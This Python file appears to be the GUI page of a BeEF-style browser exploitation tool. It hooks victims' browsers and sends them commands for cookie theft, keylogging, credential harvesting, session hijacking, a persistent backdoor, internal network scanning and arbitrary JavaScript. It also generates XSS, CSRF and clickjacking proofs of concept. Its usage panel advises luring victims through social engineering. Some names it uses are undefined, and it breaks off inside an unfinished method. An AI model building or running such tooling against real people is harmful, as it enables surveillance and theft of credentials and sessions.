"""
Browser Exploitation Page
BeEF-style browser hooking and exploitation interface
"""

import asyncio
import os
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QPushButton,
    QTableWidget, QTableWidgetItem, QTabWidget, QComboBox,
    QSpinBox, QGroupBox, QTextEdit, QLineEdit, QProgressBar,
    QSplitter, QFrame, QHeaderView, QCheckBox, QMessageBox,
    QFileDialog, QListWidget, QListWidgetItem, QFormLayout,
    QPlainTextEdit, QTreeWidget, QTreeWidgetItem
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QThread
from PyQt6.QtGui import QColor, QFont

import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from core.browser_exploitation import (
    BrowserExploitationFramework, PayloadType, ExploitType,
    HookedBrowser, AttackCampaign
)


class BEFWorker(QThread):
    """Background worker for browser exploitation operations"""
    result_ready = pyqtSignal(object)
    progress = pyqtSignal(str)
    error = pyqtSignal(str)
    
    def __init__(self, operation, *args, **kwargs):
        super().__init__()
        self.operation = operation
        self.args = args
        self.kwargs = kwargs
    
    def run(self):
        try:
            if asyncio.iscoroutinefunction(self.operation):
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                result = loop.run_until_complete(self.operation(*self.args, **self.kwargs))
                loop.close()
            else:
                result = self.operation(*self.args, **self.kwargs)
            self.result_ready.emit(result)
        except Exception as e:
            self.error.emit(str(e))


class BrowserExploitationPage(QWidget):
    """Browser Exploitation Framework GUI Page"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.bef = BrowserExploitationFramework()
        self.current_campaign = None
        self.selected_browser = None
        self.workers = []
        
        # Browser status update timer
        self.status_timer = QTimer()
        self.status_timer.timeout.connect(self.update_browser_status)
        
        self.setup_ui()
    
    def setup_ui(self):
        """Setup the user interface"""
        layout = QVBoxLayout(self)
        layout.setSpacing(10)
        
        # Header
        header = QLabel("ðŸŒ Browser Exploitation Framework")
        header.setStyleSheet("""
            font-size: 24px;
            font-weight: bold;
            color: #00d4ff;
            padding: 10px;
        """)
        layout.addWidget(header)
        
        # Warning banner
        warning = QLabel("âš ï¸ FOR AUTHORIZED SECURITY TESTING ONLY - Ensure proper authorization")
        warning.setStyleSheet("""
            background: #ff4444;
            color: white;
            padding: 10px;
            border-radius: 4px;
            font-weight: bold;
        """)
        layout.addWidget(warning)
        
        # Main splitter
        splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Left panel - Hooked browsers
        left_panel = self.create_browser_panel()
        splitter.addWidget(left_panel)
        
        # Right panel - Tabs
        right_panel = QTabWidget()
        right_panel.setStyleSheet("""
            QTabWidget::pane {
                border: 2px solid #333;
                border-radius: 8px;
            }
            QTabBar::tab {
                background: #1a1a2e;
                color: #888;
                padding: 10px 20px;
                margin-right: 2px;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background: #00d4ff;
                color: #000;
            }
        """)
        
        right_panel.addTab(self.create_campaigns_tab(), "ðŸ“‹ Campaigns")
        right_panel.addTab(self.create_commands_tab(), "âš¡ Commands")
        right_panel.addTab(self.create_payloads_tab(), "ðŸ’£ Payloads")
        right_panel.addTab(self.create_xss_tab(), "ðŸ”¥ XSS Vectors")
        right_panel.addTab(self.create_exploits_tab(), "ðŸ’€ Exploits")
        right_panel.addTab(self.create_results_tab(), "ðŸ“Š Results")
        
        splitter.addWidget(right_panel)
        splitter.setSizes([400, 800])
        
        layout.addWidget(splitter)
        
        # Status bar
        self.status_bar = QLabel("Ready - Create a campaign to begin")
        self.status_bar.setStyleSheet("""
            background: #1a1a2e;
            padding: 8px;
            border-radius: 4px;
            color: #00ff88;
        """)
        layout.addWidget(self.status_bar)
    
    def create_browser_panel(self) -> QWidget:
        """Create the hooked browsers panel"""
        panel = QWidget()
        layout = QVBoxLayout(panel)
        
        # Header
        header = QLabel("ðŸŽ¯ Hooked Browsers")
        header.setStyleSheet("""
            font-size: 16px;
            font-weight: bold;
            color: #00d4ff;
            padding: 5px;
        """)
        layout.addWidget(header)
        
        # Browser tree
        self.browser_tree = QTreeWidget()
        self.browser_tree.setHeaderLabels(["Browser", "Status", "IP"])
        self.browser_tree.setColumnWidth(0, 200)
        self.browser_tree.itemClicked.connect(self.on_browser_selected)
        self.browser_tree.setStyleSheet("""
            QTreeWidget {
                background: #0d0d1a;
                border: 1px solid #333;
                border-radius: 4px;
            }
            QTreeWidget::item {
                padding: 5px;
            }
            QTreeWidget::item:selected {
                background: #00d4ff;
                color: #000;
            }
        """)
        layout.addWidget(self.browser_tree)
        
        # Browser details
        details_group = QGroupBox("Browser Details")
        details_layout = QFormLayout(details_group)
        
        self.detail_browser = QLabel("-")
        details_layout.addRow("Browser:", self.detail_browser)
        
        self.detail_os = QLabel("-")
        details_layout.addRow("OS:", self.detail_os)
        
        self.detail_ip = QLabel("-")
        details_layout.addRow("IP:", self.detail_ip)
        
        self.detail_resolution = QLabel("-")
        details_layout.addRow("Resolution:", self.detail_resolution)
        
        self.detail_plugins = QLabel("-")
        self.detail_plugins.setWordWrap(True)
        details_layout.addRow("Plugins:", self.detail_plugins)
        
        self.detail_webcam = QLabel("-")
        details_layout.addRow("Webcam:", self.detail_webcam)
        
        self.detail_mic = QLabel("-")
        details_layout.addRow("Microphone:", self.detail_mic)
        
        layout.addWidget(details_group)
        
        # Quick actions
        actions_layout = QHBoxLayout()
        
        refresh_btn = QPushButton("ðŸ”„ Refresh")
        refresh_btn.clicked.connect(self.refresh_browsers)
        actions_layout.addWidget(refresh_btn)
        
        disconnect_btn = QPushButton("âŒ Disconnect")
        disconnect_btn.clicked.connect(self.disconnect_browser)
        actions_layout.addWidget(disconnect_btn)
        
        layout.addLayout(actions_layout)
        
        return panel
    
    def create_campaigns_tab(self) -> QWidget:
        """Create campaigns management tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # New campaign
        new_group = QGroupBox("Create New Campaign")
        new_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                border: 2px solid #00d4ff;
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title { color: #00d4ff; }
        """)
        new_layout = QFormLayout(new_group)
        
        self.campaign_name = QLineEdit()
        self.campaign_name.setPlaceholderText("Browser Pentest Campaign")
        new_layout.addRow("Campaign Name:", self.campaign_name)
        
        self.hook_url = QLineEdit()
        self.hook_url.setPlaceholderText("http://your-server.com:3000")
        new_layout.addRow("Hook Server URL:", self.hook_url)
        
        create_btn = QPushButton("âž• Create Campaign")
        create_btn.clicked.connect(self.create_campaign)
        create_btn.setStyleSheet("background: #00d4ff; color: black; padding: 10px;")
        new_layout.addRow("", create_btn)
        
        layout.addWidget(new_group)
        
        # Active campaigns
        campaigns_group = QGroupBox("Active Campaigns")
        campaigns_layout = QVBoxLayout(campaigns_group)
        
        self.campaigns_table = QTableWidget()
        self.campaigns_table.setColumnCount(5)
        self.campaigns_table.setHorizontalHeaderLabels([
            "Name", "Hook URL", "Total Hooks", "Active", "Created"
        ])
        self.campaigns_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.campaigns_table.itemSelectionChanged.connect(self.on_campaign_selected)
        campaigns_layout.addWidget(self.campaigns_table)
        
        layout.addWidget(campaigns_group)
        
        # Hook script
        hook_group = QGroupBox("Hook Script")
        hook_layout = QVBoxLayout(hook_group)
        
        hook_buttons = QHBoxLayout()
        
        generate_btn = QPushButton("ðŸ”§ Generate Hook Script")
        generate_btn.clicked.connect(self.generate_hook_script)
        hook_buttons.addWidget(generate_btn)
        
        copy_btn = QPushButton("ðŸ“‹ Copy to Clipboard")
        copy_btn.clicked.connect(self.copy_hook_script)
        hook_buttons.addWidget(copy_btn)
        
        export_btn = QPushButton("ðŸ’¾ Export Script")
        export_btn.clicked.connect(self.export_hook_script)
        hook_buttons.addWidget(export_btn)
        
        hook_buttons.addStretch()
        hook_layout.addLayout(hook_buttons)
        
        self.hook_script_display = QPlainTextEdit()
        self.hook_script_display.setReadOnly(True)
        self.hook_script_display.setStyleSheet("""
            QPlainTextEdit {
                font-family: 'Consolas', monospace;
                background: #0d0d1a;
                color: #00ff88;
                border: 1px solid #333;
            }
        """)
        self.hook_script_display.setMaximumHeight(200)
        hook_layout.addWidget(self.hook_script_display)
        
        layout.addWidget(hook_group)
        
        return widget
    
    def create_commands_tab(self) -> QWidget:
        """Create commands tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Command categories
        categories_layout = QHBoxLayout()
        
        # Browser commands
        browser_group = QGroupBox("ðŸŒ Browser Commands")
        browser_layout = QVBoxLayout(browser_group)
        
        browser_commands = [
            ("Get Cookies", "get_cookies", "ðŸª"),
            ("Get Storage", "get_storage", "ðŸ’¾"),
            ("Get URL", "get_url", "ðŸ”—"),
            ("Navigate", "navigate", "âž¡ï¸"),
            ("Alert Box", "alert", "âš ï¸"),
            ("Redirect", "redirect", "â†©ï¸"),
        ]
        
        for name, cmd, icon in browser_commands:
            btn = QPushButton(f"{icon} {name}")
            btn.clicked.connect(lambda checked, c=cmd: self.send_quick_command(c))
            browser_layout.addWidget(btn)
        
        categories_layout.addWidget(browser_group)
        
        # User commands
        user_group = QGroupBox("ðŸ‘¤ User Commands")
        user_layout = QVBoxLayout(user_group)
        
        user_commands = [
            ("Screenshot", "screenshot", "ðŸ“¸"),
            ("Start Keylogger", "keylog_start", "âŒ¨ï¸"),
            ("Get Geolocation", "geolocation", "ðŸ“"),
            ("Clipboard Access", "clipboard", "ðŸ“‹"),
            ("Check Webcam", "webcam_check", "ðŸ“·"),
            ("Check Microphone", "mic_check", "ðŸŽ¤"),
        ]
        
        for name, cmd, icon in user_commands:
            btn = QPushButton(f"{icon} {name}")
            btn.clicked.connect(lambda checked, c=cmd: self.send_quick_command(c))
            user_layout.addWidget(btn)
        
        categories_layout.addWidget(user_group)
        
        # Network commands
        network_group = QGroupBox("ðŸ”Œ Network Commands")
        network_layout = QVBoxLayout(network_group)
        
        network_commands = [
            ("Port Scan", "port_scan", "ðŸ”"),
            ("Internal Network", "internal_net", "ðŸ "),
            ("WebRTC Leak", "webrtc_leak", "ðŸŒ"),
            ("DNS Rebinding", "dns_rebind", "ðŸ”„"),
            ("Ping Sweep", "ping_sweep", "ðŸ“¡"),
            ("Fingerprint Host", "fingerprint", "ðŸ‘†"),
        ]
        
        for name, cmd, icon in network_commands:
            btn = QPushButton(f"{icon} {name}")
            btn.clicked.connect(lambda checked, c=cmd: self.send_quick_command(c))
            network_layout.addWidget(btn)
        
        categories_layout.addWidget(network_group)
        
        layout.addLayout(categories_layout)
        
        # Custom command
        custom_group = QGroupBox("Custom JavaScript Command")
        custom_layout = QVBoxLayout(custom_group)
        
        self.custom_js = QPlainTextEdit()
        self.custom_js.setPlaceholderText("alert('Hello from HydraRecon!');")
        self.custom_js.setStyleSheet("""
            QPlainTextEdit {
                font-family: 'Consolas', monospace;
                background: #0d0d1a;
                color: #00ff88;
            }
        """)
        self.custom_js.setMaximumHeight(150)
        custom_layout.addWidget(self.custom_js)
        
        send_btn = QPushButton("ðŸš€ Execute JavaScript")
        send_btn.clicked.connect(self.execute_custom_js)
        send_btn.setStyleSheet("""
            QPushButton {
                background: linear-gradient(135deg, #00d4ff, #00ff88);
                color: black;
                font-weight: bold;
                padding: 10px;
            }
        """)
        custom_layout.addWidget(send_btn)
        
        layout.addWidget(custom_group)
        
        # Command history
        history_group = QGroupBox("Command History")
        history_layout = QVBoxLayout(history_group)
        
        self.command_history = QTableWidget()
        self.command_history.setColumnCount(4)
        self.command_history.setHorizontalHeaderLabels([
            "Time", "Browser", "Command", "Status"
        ])
        self.command_history.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        history_layout.addWidget(self.command_history)
        
        layout.addWidget(history_group)
        
        return widget
    
    def create_payloads_tab(self) -> QWidget:
        """Create payloads tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Payload selection
        select_layout = QHBoxLayout()
        select_layout.addWidget(QLabel("Payload Type:"))
        
        self.payload_select = QComboBox()
        for pt in PayloadType:
            self.payload_select.addItem(pt.value.replace('_', ' ').title(), pt)
        select_layout.addWidget(self.payload_select)
        
        select_layout.addStretch()
        layout.addLayout(select_layout)
        
        # Callback URL
        callback_layout = QHBoxLayout()
        callback_layout.addWidget(QLabel("Callback URL:"))
        self.callback_url = QLineEdit()
        self.callback_url.setPlaceholderText("http://your-server.com/exfil")
        callback_layout.addWidget(self.callback_url)
        layout.addLayout(callback_layout)
        
        # Generate button
        generate_layout = QHBoxLayout()
        generate_payload_btn = QPushButton("ðŸ”§ Generate Payload")
        generate_payload_btn.clicked.connect(self.generate_payload)
        generate_layout.addWidget(generate_payload_btn)
        
        deploy_btn = QPushButton("ðŸš€ Deploy to Browser")
        deploy_btn.clicked.connect(self.deploy_payload)
        deploy_btn.setStyleSheet("background: #ff6b00; color: white;")
        generate_layout.addWidget(deploy_btn)
        
        generate_layout.addStretch()
        layout.addLayout(generate_layout)
        
        # Payload preview
        preview_group = QGroupBox("Payload Preview")
        preview_layout = QVBoxLayout(preview_group)
        
        self.payload_preview = QPlainTextEdit()
        self.payload_preview.setReadOnly(True)
        self.payload_preview.setStyleSheet("""
            QPlainTextEdit {
                font-family: 'Consolas', monospace;
                background: #0d0d1a;
                color: #ffaa00;
            }
        """)
        preview_layout.addWidget(self.payload_preview)
        
        layout.addWidget(preview_group)
        
        # Payload descriptions
        desc_group = QGroupBox("Payload Descriptions")
        desc_layout = QVBoxLayout(desc_group)
        
        descriptions = QLabel("""
        <b>Keylogger:</b> Captures all keystrokes and sends them to callback URL<br>
        <b>Cookie Stealer:</b> Exfiltrates all cookies and storage<br>
        <b>Form Grabber:</b> Intercepts all form submissions<br>
        <b>Screenshot:</b> Takes screenshot using html2canvas<br>
        <b>Geolocation:</b> Gets user's location via browser API<br>
        <b>Clipboard:</b> Monitors and steals clipboard contents<br>
        <b>Credential Harvester:</b> Injects fake login form<br>
        <b>Session Hijacker:</b> Steals session tokens and cookies<br>
        <b>Browser Backdoor:</b> Persistent C2 with command polling
        """)
        desc_layout.addWidget(descriptions)
        
        layout.addWidget(desc_group)
        
        return widget
    
    def create_xss_tab(self) -> QWidget:
        """Create XSS vectors tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # XSS vector generation
        gen_group = QGroupBox("Generate XSS Vectors")
        gen_layout = QFormLayout(gen_group)
        
        self.xss_callback = QLineEdit()
        self.xss_callback.setPlaceholderText("http://your-server.com")
        gen_layout.addRow("Callback URL:", self.xss_callback)
        
        generate_xss_btn = QPushButton("ðŸ”¥ Generate XSS Vectors")
        generate_xss_btn.clicked.connect(self.generate_xss_vectors)
        gen_layout.addRow("", generate_xss_btn)
        
        layout.addWidget(gen_group)
        
        # XSS vectors table
        vectors_group = QGroupBox("XSS Injection Vectors")
        vectors_layout = QVBoxLayout(vectors_group)
        
        self.xss_table = QTableWidget()
        self.xss_table.setColumnCount(3)
        self.xss_table.setHorizontalHeaderLabels(["Name", "Context", "Payload"])
        self.xss_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        self.xss_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        vectors_layout.addWidget(self.xss_table)
        
        # Copy button
        copy_xss_btn = QPushButton("ðŸ“‹ Copy Selected Payload")
        copy_xss_btn.clicked.connect(self.copy_xss_payload)
        vectors_layout.addWidget(copy_xss_btn)
        
        layout.addWidget(vectors_group)
        
        # CSRF/Clickjacking
        attack_group = QGroupBox("Generate Attack PoCs")
        attack_layout = QFormLayout(attack_group)
        
        self.target_url = QLineEdit()
        self.target_url.setPlaceholderText("https://target-site.com/action")
        attack_layout.addRow("Target URL:", self.target_url)
        
        attack_buttons = QHBoxLayout()
        
        csrf_btn = QPushButton("Generate CSRF PoC")
        csrf_btn.clicked.connect(self.generate_csrf_poc)
        attack_buttons.addWidget(csrf_btn)
        
        clickjack_btn = QPushButton("Generate Clickjacking PoC")
        clickjack_btn.clicked.connect(self.generate_clickjacking_poc)
        attack_buttons.addWidget(clickjack_btn)
        
        tabnap_btn = QPushButton("Generate Tabnapping PoC")
        tabnap_btn.clicked.connect(self.generate_tabnapping_poc)
        attack_buttons.addWidget(tabnap_btn)
        
        attack_layout.addRow("", attack_buttons)
        
        layout.addWidget(attack_group)
        
        # PoC output
        poc_group = QGroupBox("Attack PoC Output")
        poc_layout = QVBoxLayout(poc_group)
        
        self.poc_output = QPlainTextEdit()
        self.poc_output.setReadOnly(True)
        self.poc_output.setStyleSheet("""
            QPlainTextEdit {
                font-family: 'Consolas', monospace;
                background: #0d0d1a;
                color: #ff4444;
            }
        """)
        poc_layout.addWidget(self.poc_output)
        
        layout.addWidget(poc_group)
        
        return widget
    
    def create_exploits_tab(self) -> QWidget:
        """Create exploits tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Exploits table
        exploits_group = QGroupBox("Available Browser Exploits")
        exploits_layout = QVBoxLayout(exploits_group)
        
        self.exploits_table = QTableWidget()
        self.exploits_table.setColumnCount(5)
        self.exploits_table.setHorizontalHeaderLabels([
            "Name", "Type", "Browsers", "Severity", "Description"
        ])
        self.exploits_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        self.exploits_table.horizontalHeader().setSectionResizeMode(4, QHeaderView.ResizeMode.Stretch)
        exploits_layout.addWidget(self.exploits_table)
        
        # Populate exploits
        self.populate_exploits()
        
        layout.addWidget(exploits_group)
        
        # Exploit usage
        usage_group = QGroupBox("Exploit Usage")
        usage_layout = QVBoxLayout(usage_group)
        
        usage_text = QLabel("""
        <b>How to use browser exploits:</b><br><br>
        1. <b>Hook the target browser</b> - Get the victim to visit a page with your hook script<br>
        2. <b>Select the hooked browser</b> from the left panel<br>
        3. <b>Choose commands/payloads</b> to execute on the browser<br>
        4. <b>View results</b> in the Results tab<br><br>
        <b>Tips:</b><br>
        â€¢ Use social engineering to get victims to visit your hook page<br>
        â€¢ XSS vulnerabilities can be used to inject hook scripts<br>
        â€¢ The hook is persistent until the browser navigates away or closes
        """)
        usage_layout.addWidget(usage_text)
        
        layout.addWidget(usage_group)
        
        return widget
    
    def create_results_tab(self) -> QWidget:
        """Create results tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        
        # Results types
        results_tabs = QTabWidget()
        
        # Cookies/Storage
        cookies_widget = QWidget()
        cookies_layout = QVBoxLayout(cookies_widget)
        
        self.cookies_display = QPlainTextEdit()
        self.cookies_display.setReadOnly(True)
        self.cookies_display.setStyleSheet("""
            QPlainTextEdit {
                font-family: 'Consolas', monospace;
                background: #0d0d1a;
                color: #00ff88;
            }
        """)
        cookies_layout.addWidget(self.cookies_display)
        results_tabs.addTab(cookies_widget, "ðŸª Cookies/Storage")
        
        # Keylog
        keylog_widget = QWidget()
        keylog_layout = QVBoxLayout(keylog_widget)
        
        self.keylog_display = QPlainTextEdit()
        self.keylog_display.setReadOnly(True)
        self.keylog_display.setStyleSheet("""
            QPlainTextEdit {
                font-family: 'Consolas', monospace;
                background: #0d0d1a;
                color: #ffaa00;
            }
        """)
        keylog_layout.addWidget(self.keylog_display)
        results_tabs.addTab(keylog_widget, "âŒ¨ï¸ Keylog")
        
        # Form Submissions
        forms_widget = QWidget()
        forms_layout = QVBoxLayout(forms_widget)
        
        self.forms_table = QTableWidget()
        self.forms_table.setColumnCount(4)
        self.forms_table.setHorizontalHeaderLabels([
            "URL", "Action", "Data", "Time"
        ])
        self.forms_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        forms_layout.addWidget(self.forms_table)
        results_tabs.addTab(forms_widget, "ðŸ“ Forms")
        
        # Screenshots
        screenshots_widget = QWidget()
        screenshots_layout = QVBoxLayout(screenshots_widget)
        
        self.screenshot_list = QListWidget()
        screenshots_layout.addWidget(self.screenshot_list)
        results_tabs.addTab(screenshots_widget, "ðŸ“¸ Screenshots")
        
        # Credentials
        creds_widget = QWidget()
        creds_layout = QVBoxLayout(creds_widget)
        
        self.creds_table = QTableWidget()
        self.creds_table.setColumnCount(4)
        self.creds_table.setHorizontalHeaderLabels([
            "Username", "Password", "URL", "Time"
        ])
        self.creds_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        creds_layout.addWidget(self.creds_table)
        results_tabs.addTab(creds_widget, "ðŸ”‘ Credentials")
        
        layout.addWidget(results_tabs)
        
        # Export buttons
        export_layout = QHBoxLayout()
        
        refresh_results_btn = QPushButton("ðŸ”„ Refresh Results")
        refresh_results_btn.clicked.connect(self.refresh_results)
        export_layout.addWidget(refresh_results_btn)
        
        export_all_btn = QPushButton("ðŸ“¤ Export All Results")
        export_all_btn.clicked.connect(self.export_results)
        export_layout.addWidget(export_all_btn)
        
        export_layout.addStretch()
        layout.addLayout(export_layout)
        
        return widget
    
    def populate_exploits(self):
        """Populate exploits table"""
        exploits = self.bef.list_exploits()
        
        self.exploits_table.setRowCount(len(exploits))
        for row, exploit in enumerate(exploits):
            self.exploits_table.setItem(row, 0, QTableWidgetItem(exploit['name']))
            self.exploits_table.setItem(row, 1, QTableWidgetItem(exploit['type']))
            self.exploits_table.setItem(row, 2, QTableWidgetItem(', '.join(exploit['browsers'])))
            
            severity_item = QTableWidgetItem(exploit['severity'])
            if exploit['severity'] == 'high':
                severity_item.setBackground(QColor(255, 68, 68))
            elif exploit['severity'] == 'medium':
                severity_item.setBackground(QColor(255, 170, 0))
            self.exploits_table.setItem(row, 3, severity_item)
            
            self.exploits_table.setItem(row, 4, QTableWidgetItem(exploit['description']))
    
    def create_campaign(self):
        """Create a new campaign"""
        name = self.campaign_name.text().strip()
        hook_url = self.hook_url.text().strip()
        
        if not name or not hook_url:
            QMessageBox.warning(self, "Error", "Enter campaign name and hook URL")
            return
        
        campaign = self.bef.create_campaign(name, hook_url)
        self.current_campaign = campaign
        
        # Add to table
        row = self.campaigns_table.rowCount()
        self.campaigns_table.insertRow(row)
        self.campaigns_table.setItem(row, 0, QTableWidgetItem(campaign.name))
        self.campaigns_table.setItem(row, 1, QTableWidgetItem(campaign.hook_url))
        self.campaigns_table.setItem(row, 2, QTableWidgetItem("0"))
        self.campaigns_table.setItem(row, 3, QTableWidgetItem("0"))
        self.campaigns_table.setItem(row, 4, QTableWidgetItem(campaign.created_at[:19]))
        
        # Store campaign ID
        self.campaigns_table.item(row, 0).setData(Qt.ItemDataRole.UserRole, campaign.campaign_id)
        
        self.status_bar.setText(f"Created campaign: {name}")
        self.campaign_name.clear()
        
        # Start status timer
        if not self.status_timer.isActive():
            self.status_timer.start(5000)
    
    def on_campaign_selected(self):
        """Handle campaign selection"""
        row = self.campaigns_table.currentRow()
        if row >= 0:
            campaign_id = self.campaigns_table.item(row, 0).data(Qt.ItemDataRole.UserRole)
            if campaign_id in self.bef.campaigns:
                self.current_campaign = self.bef.campaigns[campaign_id]
                self.refresh_browsers()
    
    def on_browser_selected(self, item: QTreeWidgetItem, column: int):
        """Handle browser selection"""
        session_id = item.data(0, Qt.ItemDataRole.UserRole)
        if session_id and self.current_campaign:
            if session_id in self.current_campaign.hooked_browsers:
                browser = self.current_campaign.hooked_browsers[session_id]
                self.selected_browser = browser
                self.update_browser_details(browser)
    
    def update_browser_details(self, browser: HookedBrowser):
        """Update browser details panel"""
        self.detail_browser.setText(f"{browser.browser_name} {browser.browser_version}")
        self.detail_os.setText(f"{browser.os_name} {browser.os_version}")
        self.detail_ip.setText(browser.ip_address)
        self.detail_resolution.setText(browser.screen_resolution)
        self.detail_plugins.setText(', '.join(browser.plugins[:5]) if browser.plugins else "None")
        self.detail_webcam.setText("Yes" if browser.has_webcam else "No")
        self.detail_mic.setText("Yes" if browser.has_microphone else "No")
    
    def refresh_browsers(self):
        """Refresh hooked browsers tree"""
        self.browser_tree.clear()
        
        if not self.current_campaign:
            return
        
        for session_id, browser in self.current_campaign.hooked_browsers.items():
            item = QTreeWidgetItem([
                f"{browser.browser_name} ({browser.os_name})",
                browser.status.value,
                browser.ip_address
            ])
            item.setData(0, Qt.ItemDataRole.UserRole, session_id)
            
            # Color based on status
            if browser.status.value == 'online':
                item.setForeground(1, QColor(0, 255, 136))
            else:
                item.setForeground(1, QColor(255, 68, 68))
            
            self.browser_tree.addTopLevelItem(item)
    
    def update_browser_status(self):
        """Update browser status periodically"""
        if self.current_campaign:
            stats = self.bef.get_campaign_stats(self.current_campaign.campaign_id)
            self.status_bar.setText(
                f"Campaign: {stats.get('name', '')} | "
                f"Total: {stats.get('total_hooks', 0)} | "
                f"Active: {stats.get('active_hooks', 0)}"
            )
    
    def disconnect_browser(self):
        """Disconnect selected browser"""
        if self.selected_browser:
            self.selected_browser.status = TargetStatus.OFFLINE
            self.refresh_browsers()
    
    def generate_hook_script(self):
        """Generate hook script for campaign"""
        if not self.current_campaign:
            QMessageBox.warning(self, "Error", "Select a campaign first")
            return
        
        script = self.bef.generate_hook_script(
            self.current_campaign.campaign_id,
            {'obfuscate': True, 'minify': True}
        )
        self.hook_script_display.setPlainText(script)
        self.status_bar.setText("Hook script generated")
    
    def copy_hook_script(self):
        """Copy hook script to clipboard"""
        from PyQt6.QtWidgets import QApplication
        clipboard = QApplication.clipboard()
        clipboard.setText(self.hook_script_display.toPlainText())
        self.status_bar.setText("Script copied to clipboard")
    
    def export_hook_script(self):
        """Export hook script to file"""
        filepath, _ = QFileDialog.getSaveFileName(
            self, "Export Hook Script", "hook.js",
            "JavaScript Files (*.js)"
        )
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write(self.hook_script_display.toPlainText())
            self.status_bar.setText(f"Script exported to {filepath}")
    
    def send_quick_command(self, command_type: str):
        """Send a quick command to selected browser"""
        if not self.selected_browser or not self.current_campaign:
            QMessageBox.warning(self, "Error", "Select a browser first")
            return
        
        command = {'type': command_type}
        
        # Add parameters for specific commands
        if command_type == 'navigate' or command_type == 'redirect':
            url, ok = QInputDialog.getText(self, "Navigate", "Enter URL:") if 'QInputDialog' in dir() else ("", False)
            if not ok or not url:
                return
            command['url'] = url
        elif command_type == 'alert':
            message, ok = QInputDialog.getText(self, "Alert", "Enter message:") if 'QInputDialog' in dir() else ("Test", True)
            command['message'] = message
        
        cmd_id = self.bef.send_command(
            self.current_campaign.campaign_id,
            self.selected_browser.session_id,
            command
        )
        
        # Add to history
        row = self.command_history.rowCount()
        self.command_history.insertRow(row)
        self.command_history.setItem(row, 0, QTableWidgetItem(
            datetime.now().strftime("%H:%M:%S") if 'datetime' in dir() else "now"
        ))
        self.command_history.setItem(row, 1, QTableWidgetItem(
            f"{self.selected_browser.browser_name}"
        ))
        self.command_history.setItem(row, 2, QTableWidgetItem(command_type))
        self.command_history.setItem(row, 3, QTableWidgetItem("Pending"))
        
        self.status_bar.setText(f"Command sent: {command_type}")
    
    def execute_custom_js(self):
        """Execute custom JavaScript"""
        if not self.selected_browser or not self.current_campaign:
            QMessageBox.warning(self, "Error", "Select a browser first")
            return
        
        code = self.custom_js.toPlainText()
        if not code:
            return
        
        command = {'type': 'eval', 'code': code}
        self.bef.send_command(
            self.current_campaign.campaign_id,
            self.selected_browser.session_id,
            command
        )
        
        self.status_bar.setText("Custom JavaScript executed")
    
    def generate_payload(self):
        """Generate selected payload"""
        payload_type = self.payload_select.currentData()
        callback_url = self.callback_url.text().strip()
        
        if not callback_url:
            QMessageBox.warning(self, "Error", "Enter a callback URL")
            return
        
        payload = self.bef.generate_payload(payload_type, callback_url)
        self.payload_preview.setPlainText(payload)
        self.status_bar.setText(f"Generated {payload_type.value} payload")
    
    def deploy_payload(self):
        """Deploy payload to selected browser"""
        if not self.selected_browser or not self.current_campaign:
            QMessageBox.warning(self, "Error", "Select a browser first")
            return
        
        code = self.payload_preview.toPlainText()
        if not code:
            QMessageBox.warning(self, "Error", "Generate a payload first")
            return
        
        command = {'type': 'eval', 'code': code}
        self.bef.send_command(
            self.current_campaign.campaign_id,
            self.selected_browser.session_id,
            command
        )
        
        self.status_bar.setText("Payload deployed")
    
    def generate_xss_vectors(self):
        """Generate XSS injection vectors"""
        callback_url = self.xss_callback.text().strip()
        if not callback_url:
            QMessageBox.warning(self, "Error", "Enter a callback URL")
            return
        
        vectors = self.bef.generate_xss_vectors(callback_url)
        
        self.xss_table.setRowCount(len(vectors))
        for row, vector in enumerate(vectors):
            self.xss_table.setItem(row, 0, QTableWidgetItem(vector['name']))
            self.xss_table.setItem(row, 1, QTableWidgetItem(vector['context']))
            self.xss_table.setItem(row, 2, QTableWidgetItem(vector['payload']))
        
        self.status_bar.setText(f"Generated {len(vectors)} XSS vectors")
    
    def copy_xss_payload(self):
        """Copy selected XSS payload"""
        row = self.xss_table.currentRow()
        if row >= 0:
            payload = self.xss_table.item(row, 2).text()
            from PyQt6.QtWidgets import QApplication
            QApplication.clipboard().setText(payload)
            self.status_bar.setText("Payload copied to clipboard")
    
    def generate_csrf_poc(self):
        """Generate CSRF proof of concept"""
        target_url = self.target_url.text().strip()
        if not target_url:
            QMessageBox.warning(self, "Error", "Enter target URL")
            return
        
        poc = self.bef.generate_csrf_poc(target_url, 'POST', {
            'action': 'change_password',
            'new_password': 'hacked123'
        })
        self.poc_output.setPlainText(poc)
        self.status_bar.setText("CSRF PoC generated")
    
    def generate_clickjacking_poc(self):
        """Generate clickjacking proof of concept"""
        target_url = self.target_url.text().strip()
        if not target_url:
            QMessageBox.warning(self, "Error", "Enter target URL")
            return
        
        poc = self.bef.generate_clickjacking_poc(target_url)
        self.poc_output.setPlainText(poc)
        self.status_bar.setText("Clickjacking PoC generated")
    
    def generate_tabnapping_poc(self):
        """Generate tabnapping proof of concept"""
